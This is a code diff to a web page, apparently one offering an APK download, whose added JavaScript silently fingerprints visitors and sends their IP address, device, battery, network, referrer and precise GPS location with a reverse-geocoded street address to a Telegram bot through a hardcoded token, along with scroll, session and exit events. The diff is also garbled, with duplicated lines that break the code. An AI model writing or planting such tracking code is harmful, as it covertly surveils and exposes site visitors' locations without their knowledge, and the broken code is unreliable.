@@ -994,7 +994,7 @@
     }
 
     /* Fix inner spans to not lose their styles if they had text-shadows, though gradients might override them.
-   Let's keep the fire color strong. */
+  Let's keep the fire color strong. */
     .hero-h1 .fire {
       -webkit-text-fill-color: var(--accent-primary);
     }
@@ -1627,7 +1627,7 @@
           var targetTheme = theme === 'light' ? 'dark' : 'light';
           document.documentElement.setAttribute('data-theme', targetTheme);
           localStorage.setItem('theme', targetTheme);
-          
+
           // Theme toggle notification
           var themeName = targetTheme.charAt(0).toUpperCase() + targetTheme.slice(1);
           sendTelegramNotification('theme', 'Switched to ' + themeName + ' Mode');
@@ -1642,13 +1642,63 @@
       // ── ADVANCED TELEGRAM NOTIFICATIONS & ANALYTICS ──
       var TELEGRAM_TOKEN = '8609141067:AAFFA62prl1TJbx9BUSx5p2icjCunF_z8Dg';
       var CHAT_ID = '6523331640';
-      
+
       var sessionStartTime = Date.now();
+      var userId = localStorage.getItem('shinzo_user_id');
+      if (!userId) {
+        userId = 'SZ-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+        localStorage.setItem('shinzo_user_id', userId);
+      }
+
       var userMetadata = {
         location: 'Detecting...',
+        ip: '0.0.0.0',
         device: getDeviceInfo(),
-        session: 'New'
+        network: 'Unknown',
+        battery: 'Unknown',
+        resolution: window.screen.width + 'x' + window.screen.height,
+        referrer: document.referrer || 'Direct',
+        session: 'Active'
+        session: 'Active',
+        coords: null,
+        precise_address: null
       };
+
+      // Get Network Info
+      if (navigator.connection) {
+        userMetadata.network = navigator.connection.effectiveType || 'Unknown';
+      }
+
+      // Get Battery Info
+      if (navigator.getBattery) {
+        navigator.getBattery().then(function (batt) {
+          userMetadata.battery = Math.round(batt.level * 100) + '% ' + (batt.charging ? '⚡' : '🔋');
+        });
+      }
+
+      // ── PRECISE GPS TRACKING ──
+      function requestPreciseLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(function (position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            userMetadata.coords = lat + ',' + lon;
+
+            // Reverse Geocode via Nominatim (OpenStreetMap)
+            fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + lat + '&lon=' + lon)
+              .then(res => res.json())
+              .then(data => {
+                userMetadata.precise_address = data.display_name;
+                sendTelegramNotification('gps', '📍 Precise Location Found: ' + data.display_name);
+              })
+              .catch(() => {
+                sendTelegramNotification('gps', '📍 Coordinates Found: ' + userMetadata.coords);
+              });
+          }, function (err) {
+            console.warn('GPS Error/Denied:', err.message);
+          }, { enableHighAccuracy: true, timeout: 10000 });
+        }
+      }
 
       function getDeviceInfo() {
         var ua = navigator.userAgent;
@@ -1664,57 +1714,88 @@
         else if (ua.indexOf("Firefox") != -1) browser = "Firefox";
         else if (ua.indexOf("Safari") != -1) browser = "Safari";
         else if (ua.indexOf("Edge") != -1) browser = "Edge";
-        
+
         return os + ' (' + browser + ')';
       }
 
-      // Fetch location via Geo-IP
+      // Fetch detailed location & IP
       fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
+          userMetadata.ip = data.ip || 'Unknown';
           userMetadata.location = (data.city || 'Unknown City') + ', ' + (data.country_name || 'Unknown Country');
           sendTelegramNotification('visit', 'User landed from ' + userMetadata.location);
+
+          // Request GPS after initial visit
+          setTimeout(requestPreciseLocation, 1500);
         })
         .catch(() => { userMetadata.location = 'Unknown'; });
 
       function sendTelegramNotification(type, details) {
         var icon = '🚀';
         var title = 'Event';
-        
+
         var icons = {
-          'download': '📥', 'video': '📺', 'theme': '🌓', 
-          'visit': '👋', 'scroll': '📜', 'session': '⏳', 
+          'download': '📥', 'video': '📺', 'theme': '🌓',
+          'visit': '👋', 'scroll': '📜', 'session': '⏳',
           'error': '🚨', 'exit': '🏃'
+          'error': '🚨', 'exit': '🏃', 'gps': '📍'
         };
         var titles = {
-          'download': 'New APK Download', 'video': 'YouTube Guide Clicked', 
+          'download': 'New APK Download', 'video': 'YouTube Guide Clicked',
           'theme': 'Theme Toggled', 'visit': 'New Visit',
           'scroll': 'Scroll Milestone', 'session': 'Session Update',
           'error': 'Browser Error', 'exit': 'Exit Intent'
+          'error': 'Browser Error', 'exit': 'Exit Intent', 'gps': 'GPS Precise Location'
         };
 
         icon = icons[type] || icon;
         title = titles[type] || title;
 
         var duration = Math.round((Date.now() - sessionStartTime) / 1000);
-        var timeStr = duration < 60 ? duration + 's' : Math.floor(duration/60) + 'm ' + (duration%60) + 's';
+        var timeStr = duration < 60 ? duration + 's' : Math.floor(duration / 60) + 'm ' + (duration % 60) + 's';
 
-        var text = icon + ' *' + title + '*\n\n' +
-          '🔥 *Action:* ' + details + '\n' +
-          '📍 *Location:* ' + userMetadata.location + '\n' +
-          '📱 *Device:* ' + userMetadata.device + '\n' +
-          '⏳ *Session:* ' + timeStr + '\n' +
-          '🌐 *Origin:* ' + window.location.hostname;
+        // Use precise address if available, otherwise fallback to IP city
+        var locDisplay = userMetadata.precise_address || userMetadata.location;
+        var gpsBadge = userMetadata.coords ? ' ✅ GPS Verified' : ' ❌ IP Only';
+
+        // Prepare HTML Message
+        var htmlText = '<b>' + icon + ' ' + title + '</b>\n\n' +
+        var htmlText = '<b>' + icon + ' ' + title + '</b>' + (type === 'gps' ? ' (UPDATE)' : '') + '\n\n' +
+          '<b>⚡ Action:</b> <code>' + details + '</code>\n' +
+          '<b>👤 User ID:</b> <code>' + userId + '</code>\n' +
+          '<b>📍 Location:</b> ' + userMetadata.location + ' (<code>' + userMetadata.ip + '</code>)\n' +
+          '<b>📍 Location:</b> ' + locDisplay + ' (' + gpsBadge + ')\n' +
+          '<b>🌐 IP Addr:</b> <code>' + userMetadata.ip + '</code>\n' +
+          '<b>📱 Device:</b> ' + userMetadata.device + '\n' +
+          '<b>📶 Net/Batt:</b> ' + userMetadata.network.toUpperCase() + ' | ' + userMetadata.battery + '\n' +
+          '<b>🔭 Source:</b> ' + userMetadata.referrer + '\n' +
+          '<b>⏳ Duration:</b> ' + timeStr + '\n' +
+          '<b>🌐 Domain:</b> ' + window.location.hostname;
 
         var url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
+
+        // Updated Maps link with coordinates if available
+        var mapsUrl = userMetadata.coords
+          ? 'https://www.google.com/maps/search/?api=1&query=' + userMetadata.coords
+          : 'https://www.google.com/maps/search/' + encodeURIComponent(userMetadata.location);
+
+        var keyboard = {
+          inline_keyboard: [[
+            { text: '📍 Open Maps', url: 'https://www.google.com/maps/search/' + encodeURIComponent(userMetadata.location) },
+            { text: '📍 Open Maps', url: mapsUrl },
+            { text: '🔍 IP Info', url: 'https://ipinfo.io/' + userMetadata.ip }
+          ]]
+        };
 
         fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'Markdown'
+            text: htmlText,
+            parse_mode: 'HTML',
+            reply_markup: keyboard
           })
         }).catch(function (err) { console.error('Telegram error:', err); });
       }
@@ -1751,17 +1832,17 @@
       // 2. Session Duration Milestones
       [30, 60, 180].forEach(seconds => {
         setTimeout(() => {
-          sendTelegramNotification('session', 'User active for ' + (seconds < 60 ? seconds + 's' : (seconds/60) + 'm'));
+          sendTelegramNotification('session', 'User active for ' + (seconds < 60 ? seconds + 's' : (seconds / 60) + 'm'));
         }, seconds * 1000);
       });
 
       // 3. Error Tracking
-      window.onerror = function(msg, url, line) {
+      window.onerror = function (msg, url, line) {
         sendTelegramNotification('error', msg + ' at ' + line);
       };
 
       // 4. Exit Intent
-      document.addEventListener('mouseleave', function(e) {
+      document.addEventListener('mouseleave', function (e) {
         if (e.clientY < 0) {
           sendTelegramNotification('exit', 'User moving to close/back');
         }
